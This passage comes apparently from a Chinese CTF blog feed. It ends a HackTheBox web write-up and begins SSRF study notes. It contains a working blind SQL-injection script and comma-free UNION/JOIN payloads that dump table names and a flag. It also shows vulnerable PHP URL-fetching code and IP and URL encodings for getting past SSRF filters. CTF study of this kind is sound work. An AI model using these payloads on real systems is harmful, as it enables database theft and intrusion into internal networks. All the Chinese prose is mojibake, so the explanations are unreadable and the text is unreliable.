class="number">128</span>):</span><br><span class="line">        url = <span class="string">"http://docker.hackthebox.eu:32614/index.php?obj="</span> <span class="comment">#10.3.20-MariaDB</span></span><br><span class="line">        payload = <span class="string">"1' and ascii(substr((select database()) from "</span>+str(i)+<span class="string">" for 1))="</span> + str(j) + <span class="string">"#"</span></span><br><span class="line">        payload = base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">        url += payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">        body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Good'</span> <span class="keyword">in</span> body:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç”±äºä¸éœ€è¦ç»•å…¶ä»–è¿‡æ»¤ï¼Œåªéœ€è¦ç”¨<code>select case from {0} for 1</code>ä»£æ›¿<code>substr(case,{0},1)</code>ã€‚ç„¶è€Œç›²æ³¨è„šæœ¬åªèƒ½è§£å†³è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œå¾—ä¸åˆ°è¡¨åï¼Œè€Œä¸”è¿˜è´¼æ…¢ï¼Œæˆ‘åªèƒ½å¦å¯»å…¶ä»–æ–¹æ³•æ³¨å…¥è¡¨åã€‚</p><p>è€ƒè™‘åˆ°é€—å·è¿‡æ»¤æ—¶å¦ä¸€ç§æ–¹æ³•ï¼Œ<code>join</code>æ³¨å…¥ï¼Œæˆ‘ä»¬æ ¹æ®ç¡®è®¤çš„ä¸¤ä¸ª<br>å­—æ®µæ•°æ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;1&#39; union select* from (select 1)a join (select 2)b#&quot;</span><br></pre></td></tr></table></figure><p>ç»“æœå‡ºä¹æˆ‘æ„æ–™ä¹‹å¤–ï¼Œå›æ˜¾å‡ºç°äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good Luck, You&#39;ve got that this is really gonna be an intersting challenge :)2</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ç¬¬äºŒä¸ªå­—æ®µæœ‰å›æ˜¾â€¦â€¦æ‰€ä»¥å…¶å®ä¸éœ€è¦ç›²æ³¨ï¼Œç›´æ¥æ ¹æ®å›æ˜¾union selectåšå°±å¥½äº†ã€‚<br>æ‰€ä»¥ä¸‹ä¸€æ­¥å‡†å¤‡æ‹¿åˆ°è¡¨åï¼Œè¿™é‡Œåœ¨æˆ‘å§‹ç»ˆçº ç»“äºæ— æ³•ä½¿ç”¨<code>group_concat()</code>è¦æ€ä¹ˆæ‹¿åˆ°å…¨éƒ¨æ•°æ®æ—¶ï¼Œå¸ˆå‚…çš„æç¤ºè®©æˆ‘æ³¨æ„åˆ°äº†è¿™é‡Œçš„æŠ¥é”™å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning:  mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, bool given in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 34</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„sqlæ³¨å…¥æ˜¯é€šè¿‡<code>mysqli_fetch_assoc()</code>è¾¾æˆçš„ï¼Œå…¶è¿”å›å€¼ä¸ºï¼šè¿”å›ä»£è¡¨è¯»å–è¡Œçš„å…³è”æ•°ç»„ã€‚æ‰€ä»¥ä¸éœ€è¦concatï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ä¸€è¡Œæ³¨å…¥å¾—åˆ°çš„å…¨éƒ¨æ•°æ®ã€‚<br>æ‰€ä»¥æ³¨å…¥è¡¨åå°±ä¸å†æ‹…å¿ƒé‚£äº›é—®é¢˜ï¼Œåªè¦æŠŠ<code>information_schema.tables</code>çš„ä»£æ›¿æ‰¾åˆ°å°±å¥½(ç”±äºä¹‹å‰æ³¨å…¥è¿‡ç‰ˆæœ¬ï¼Œç¡®è®¤æ˜¯10.3.20ï¼Œå¯ä»¥ç”¨<code>mysql.innodb_table_stats</code>ä»£æ›¿)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;&#39; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#&quot;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¡¨åçš„è¿æ¥å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATAFlagTableUnguessableEzPZgtid_slave_pos</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”±äº<code>information_schema.columns</code>æ‰¾ä¸åˆ°æ›¿ä»£æ–¹å¼ï¼Œçœ‹æ¥æ˜¯è·Ÿswpuä¸€æ ·çš„æ— åˆ—åæ³¨å…¥äº†ã€‚ä¹‹å‰æ–‡ç« é‡Œä¹Ÿå†™è¿‡ï¼Œè€Œæ­¤å¤„çš„æ— åˆ—åæ³¨å…¥ç¨æœ‰åŒºåˆ«ï¼Œå±äºæœªè¿‡æ»¤<code>`</code>åå¼•å·ï¼Œè¿‡æ»¤æ‰é€—å·çš„æƒ…å†µã€‚æ‰€ä»¥æ¨¡æ¿æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#39; union select * from (select 1)a join (select &#96;2&#96; from (select * from (select 1)a join (select 2)b join (select 3)c union select * from &#39;è¡¨å&#39;)i )b #</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šè¿™é“é¢˜ç›®ä¸ç¬¬äº”å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› easysqlååˆ†ç›¸åƒï¼Œå› æ­¤å¯ä»¥ä½œä¸ºå‚è€ƒã€‚<br>ä¸‹é¢ä¸€æ­¥å°±æ˜¯è¦çŒœå­—æ®µæ•°è·Ÿè¡¨åäº†ï¼Œé¦–å…ˆåˆ¤æ–­è¡¨åï¼Œä¸Šç½‘æœä¸‹å‘ç°<code>mysql.gtid_slave_pos</code>æ˜¯ä¸€ç§ç³»ç»Ÿè¡¨ï¼Œæ‰€ä»¥ä¼°è®¡æœ€åä¸€éƒ¨åˆ† <code>gtid_slave_pos</code>æ˜¯ä¸€å¼ è¡¨ã€‚ä¹‹åæŒ‰ç…§è¿™ä¸ªæ¨¡æ¿ä¸å˜ï¼Œåªæ”¹è¡¨åï¼Œå‘ç°<code>Data</code>æ˜¯ä¸€å¼ è¡¨ã€‚ä¸”å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰å›æ˜¾çš„sqlæ³¨å…¥æç¤ºçš„å†…å®¹ï¼Œæ•…åˆšå¥½2ä¸ªå­—æ®µã€‚<br>é‚£ä¹ˆä¼°è®¡flagå°±åœ¨<code>FlagTableUnguessableEzPZ</code>è¿™å¼ è¡¨äº†ï¼Œè€Œä¸”çŒœæµ‹ä¸€å¼ æœ‰flagè¡¨åªæœ‰ä¸€åˆ—ï¼Œæ‰€ä»¥æ”¹æˆä¸€ä¸ªå­—æ®µè¯•è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"' UNION SELECT * FROM (SELECT 1)m JOIN (SELECT `1` from (select * from (select 1)a union select * from  FlagTableUnguessableEzPZ)x )n#"</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°flagã€‚</p><p>æ€»ç»“ä¸‹å§ï¼Œè¿™ç®—æ˜¯ä¸€é“å¾ˆæœ‰è¥å…»çš„é¢˜ç›®äº†ã€‚å¦‚æœèƒ½æ ¹æ®æŠ¥é”™å‘ç°åé¢çš„sqlæ³¨å…¥ï¼Œå°±ç®—è·¨è¿‡äº†ä¸€å¤§æ­¥ï¼Œè¿™äº›ä¸»è¦æ˜¯å¯¹phpç‰¹æ€§çš„ç†è§£ã€‚è€Œæˆ‘åœ¨sqlæ³¨å…¥è¿™ä¸€æ­¥ä¸Šå€’æ˜¯ä¹Ÿå¡äº†å¥½ä¹…â€¦â€¦ä¸è¿‡é¢˜ç›®å¾ˆå¥½çš„å¸®æˆ‘å†ä¸€æ¬¡å¤ä¹ äº†æ— åˆ—åæ³¨å…¥è¿™ä¸ªæœ‰æ„æ€çš„çŸ¥è¯†ç‚¹ï¼Œä»¥åŠ<code>join</code>ç»•è¿‡é€—å·è¿™ä¸€ç»å…¸æ–¹æ³•ã€‚çœ‹æ¥å¯ä»¥ä½œä¸ºbypass<code>information_schema</code>çš„å¸¸è§„æ­¦å™¨ä½¿ç”¨äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-SSRFåŸºç¡€</title>
      <link href="2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/"/>
      <url>2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºå‡†å¤‡æŠŠæ¬ äº†å¥½ä¹…çš„SSRFå­¦ä¹ è®°å½•ä¸€ä¸‹äº†ã€‚æœ€æ—©æ¥è§¦SSRFæ˜¯å»å¹´æš‘å‡ï¼Œå¸ˆå‚…ç»™äº†æˆ‘ä¸€é“éƒç¦»æ­Œå‡ºçš„å…¥ç¾¤é¢˜ã€‚å½“æ—¶å¯¹SSRFä¸€æ— æ‰€çŸ¥ï¼Œä¸œæ‹¼è¥¿å‡‘æ‰å¾—åˆ°ä¸€ä¸ªipã€‚å¯æƒœå½“æ—¶ä¸çŸ¥é“æ˜¯å†…ç½‘ip,æœ€åæ¶‰åŠä¸€ä¸ªgopheræ‰“mysqlçš„å¸¸è§ç±»å‹ï¼Œæœ€åä¹Ÿæ²¡èƒ½åšå‡ºæ¥ã€‚é‚£ä¹‹åä¹Ÿæ²¡æœ‰ä»”ç»†åšè¿‡ssrfé¢˜ç›®ï¼Œé‚£æˆ‘ç°åœ¨å°±æ¥è®°å½•ä¸€ä¸‹ssrfçš„å­¦ä¹ ç¬”è®°å§ã€‚</p><a id="more"></a><h1 id="1-SSRF"><a href="#1-SSRF" class="headerlink" title="1. SSRF"></a>1. SSRF</h1><p>  ssrfå…¨ç§°ä¸ºServer-side Request Forgeryï¼Œå³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»ã€‚å¾ˆå¤šwebåº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–çš„æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ã€‚ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼Œwebåº”ç”¨å¯ä»¥è·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚è¿™ä¸ªåŠŸèƒ½å¦‚æœè¢«æ¶æ„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œssrfçš„æ¼æ´ç‚¹åœ¨äºï¼š<strong>æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œåœ¨ç”¨æˆ·å¯æ§çš„æƒ…å†µä¸‹ï¼Œæœªå¯¹ç›®æ ‡åœ°å€è¿›è¡Œè¿‡æ»¤ä¸é™åˆ¶</strong>.<br>å¸¸è§åœºæ™¯åŒ…æ‹¬ä½†ä¸ä»…é™äºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</span><br><span class="line">2.è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</span><br><span class="line">3.åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</span><br><span class="line">4.å›¾ç‰‡åŠ è½½&#x2F;ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</span><br><span class="line">#æ¯”å¦‚hgameweek2</span><br><span class="line">5.å›¾ç‰‡&#x2F;æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ</span><br><span class="line">6.äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯•</span><br><span class="line">7.ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦ä»æœåŠ¡ç«¯çš„æºç å±‚é¢æ¥è®²ï¼Œä¸»è¦å°±æ˜¯ä»¥ä¸‹ä¸‰ç§å‡½æ•°(php)ï¼š</p><p><strong>1.file_get_contents()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">$content = file_get_contents($_POST[<span class="string">'url'</span>]); </span><br><span class="line">$filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span><br><span class="line">file_put_contents($filename, $content); </span><br><span class="line"><span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span><br><span class="line">$img = <span class="string">"&lt;img src=\""</span>.$filename.<span class="string">"\"/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> $img; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¸¸è§çš„ç›´æ¥ç”¨<code>file_get_contents()</code>åŠ è½½urlæŒ‡å‘æ–‡ä»¶<br><strong>2.fsockopen()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">$out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"\r\n"</span>; </span><br><span class="line">fwrite($fp, $out); </span><br><span class="line">$contents=<span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">$contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp); </span><br><span class="line"><span class="keyword">return</span> $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚</p><p><strong>3.curl_exec()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$link = $_POST[<span class="string">'url'</span>];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($curlobj);</span><br><span class="line">curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">$filename = <span class="string">'./curled/'</span>.rand().<span class="string">'.txt'</span>;</span><br><span class="line">file_put_contents($filename, $result); </span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‡å¦‚å‡ºç°ä»¥ä¸Šå‡ ç§å‡½æ•°ï¼ˆå·²çŸ¥æºç å‰æä¸‹ï¼‰ï¼Œé€šå¸¸å¯ä»¥å°è¯•ä½¿ç”¨ssrfã€‚</p><h1 id="2-SSRFçš„åˆ©ç”¨"><a href="#2-SSRFçš„åˆ©ç”¨" class="headerlink" title="2.SSRFçš„åˆ©ç”¨"></a>2.SSRFçš„åˆ©ç”¨</h1><p>å®è¯è¯´ï¼Œssrfä¸åƒsqlï¼Œxssé‚£æ ·å±äºäººå°½çš†çŸ¥çš„æ¼æ´ã€‚ä½†å…¶åˆ©ç”¨åœ¨çœŸå®æ¸—é€ä¸­æ˜¯éå¸¸å¸¸è§çš„ã€‚å…¶åˆ©ç”¨åœºæ™¯ä¸»è¦æœ‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.è®©æœåŠ¡ç«¯å»è®¿é—®ç›¸åº”çš„ç½‘å€</span><br><span class="line">(æ¯”å¦‚è¯»&#x2F;flagä¹‹ç±»çš„)</span><br><span class="line">2.è®©æœåŠ¡ç«¯å»è®¿é—®è‡ªå·±æ‰€å¤„å†…ç½‘çš„ä¸€äº›æŒ‡çº¹æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„cms</span><br><span class="line">3.å¯ä»¥ä½¿ç”¨&#96;&#96;&#96;fileã€dictã€gopherã€ftp&#96;&#96;&#96;åè®®è¿›è¡Œè¯·æ±‚è®¿é—®ç›¸åº”çš„æ–‡ä»¶</span><br><span class="line">(å…¶ä¸­gopherè¢«ç§°ä½œä¸‡é‡‘æ²¹ï¼Œå¯ä»¥æ‰“å†…ç½‘ä¹Ÿå¯ä»¥get,post,å½“ç„¶è¿˜æœ‰æ”»å‡»å†…ç½‘æœªæˆæƒçš„mysqlï¼Œä¸»è¦åŒºåˆ«åœ¨äºä¸é»˜è®¤ç«¯å£)</span><br><span class="line">4.æ”»å‡»å†…ç½‘webåº”ç”¨ï¼ˆå¯ä»¥å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…&#123;payload&#125;ï¼‰</span><br><span class="line">(ssrfæ‰“redis)</span><br><span class="line">5.æ”»å‡»å†…ç½‘åº”ç”¨ç¨‹åºï¼ˆåˆ©ç”¨è·¨åè®®é€šä¿¡æŠ€æœ¯ï¼‰</span><br><span class="line">6.åˆ¤æ–­å†…ç½‘ä¸»æœºæ˜¯å¦å­˜æ´»ï¼šæ–¹æ³•æ˜¯è®¿é—®çœ‹æ˜¯å¦æœ‰**ç«¯å£å¼€æ”¾**</span><br><span class="line">7.åˆ©ç”¨pharåè®®è§¦å‘ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><p>CTFé¢˜ç›®ä¸­å…·ä½“è§è¿‡çš„åŒ…æ‹¬ä¹‹å‰hackergameçš„ä¸€é“ä¼ªssrfï¼ˆåªæ¶‰åŠåˆ°urlï¼‰ï¼›NCTF2019 True-XML-Cookbook<br>ä»¥åŠhgameçš„Cosmosçš„åšå®¢åå°ï¼ˆæœç„¶è¿˜æ˜¯åšå¾—å¤ªå°‘äº†ï¼‰</p><h1 id="3-ç»•è¿‡"><a href="#3-ç»•è¿‡" class="headerlink" title="3.ç»•è¿‡"></a>3.ç»•è¿‡</h1><p>å…³äºç»•è¿‡ï¼ŒæŠŠé‡ç‚¹æ”¾åœ¨å‡ ä¸ªå¤§ç±»ä¸Šï¼š<br> 1ï¼‰ipåœ°å€ç»•è¿‡<br>å¯¹<code>192.168.0.1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">8è¿›åˆ¶ï¼š0300.0250.0.1</span><br><span class="line">16è¿›åˆ¶ï¼š0xC0.0xA8.0.1</span><br><span class="line">10è¿›####åˆ¶ï¼š3232235521</span><br><span class="line">16è¿›åˆ¶æ•´æ•°: 0xC0A80001</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡çœç•¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœ<br>å¯¹10.0.0.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.http:&#x2F;&#x2F;0&#x2F;</span><br><span class="line">2.http:&#x2F;&#x2F;127.1&#x2F;</span><br><span class="line">3.ipv6:http:&#x2F;&#x2F;[::1]&#x2F;</span><br><span class="line">4.http:&#x2F;&#x2F;127.0.0.1.&#x2F;</span><br></pre></td></tr></table></figure><h4 id="2-url-bypass"><a href="#2-url-bypass" class="headerlink" title="2)url bypass"></a>2)url bypass</h4><p>è¿™åº”è¯¥æ˜¯æ˜¯åŸºç¡€ç±»ssrfæœ€å¸¸è§çš„è€ƒç‚¹äº†ï¼Œæ¯”è¾ƒé€‚åˆæˆ‘è¿™æ ·çš„èŒæ–°æ€»ç»“ã€‚<br>åœ¨è°ˆåŠç»•è¿‡ä¹‹å‰ï¼Œå…ˆæ¥ç†è§£ä¸‹urlçš„åŸºæœ¬æ¦‚å¿µï¼š<br><img src="/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="url"><br>å¯ä»¥æ³¨æ„åˆ°urlçš„ç»„æˆéƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scheme åè®®</span><br><span class="line">authority æƒé™&#x3D;ä¸»æœºå+ç«¯å£å· ï¼Œå†è¯¦ç»†ä¸€ç‚¹å¦‚</span><br><span class="line">![2.jpg](https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;18060177-6d443ccaaa9138ba.jpg?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240)</span><br><span class="line">admin:admin@www.example.com:2333&#96;ï¼ˆä½¿ç”¨ç”¨æˆ·åä¸º adminï¼Œå¯†ç ä¸º adminï¼Œè®¿é—®Â www.example.comÂ çš„ 2333 ç«¯å£è·å–èµ„æºï¼‰</span><br><span class="line">path è·¯å¾„</span><br><span class="line">query æŸ¥è¯¢</span><br><span class="line">fragment æŒ‡å‘ä¸€ä¸ªæ›´ä½çº§åˆ«çš„èµ„æº</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¸¸å¸¸é€šè¿‡æ„é€ urlæ¥bypassä¸ªåˆ«å‡½æ•°ï¼Œæœ€ç»ˆè¾¾æˆssrfçš„ç›®çš„ã€‚<br>è€Œorangeçš„é‚£ç¯‡ç»å…¸çš„pdfæŒ‡å‡ºäº†å‡ ä¸ªå‡½æ•°åˆ©ç”¨ä¸Šçš„ç»å…¸æ¼æ´ï¼Œå…¶ä¸­ç¦»ä¸å¼€ä¸€ä¸ª<code>@</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php parse_urlï¼š</span><br><span class="line">host: åŒ¹é…æœ€åä¸€ä¸ª@åé¢ç¬¦åˆæ ¼å¼çš„host</span><br><span class="line"></span><br><span class="line">libcurlï¼š</span><br><span class="line">hostï¼šåŒ¹é…ç¬¬ä¸€ä¸ª@åé¢ç¬¦åˆæ ¼å¼çš„host</span><br></pre></td></tr></table></figure><p><img src="/2020/02/05/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SSRF%E5%9F%BA%E7%A1%80/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="parse_url"><br>åˆ©ç”¨<code>@</code>å¯ä»¥è½»æ¾ä½¿google.comï¼ˆé»˜è®¤ç™½åå•ï¼‰ç½®ä¸ºhostï¼Œè¾¾åˆ°ç»•è¿‡php parse_urlçš„æ•ˆæœï¼ˆè¿™é‡Œç”¨#å°†@å¿½ç•¥äº†ï¼‰</p><p>åŒæ 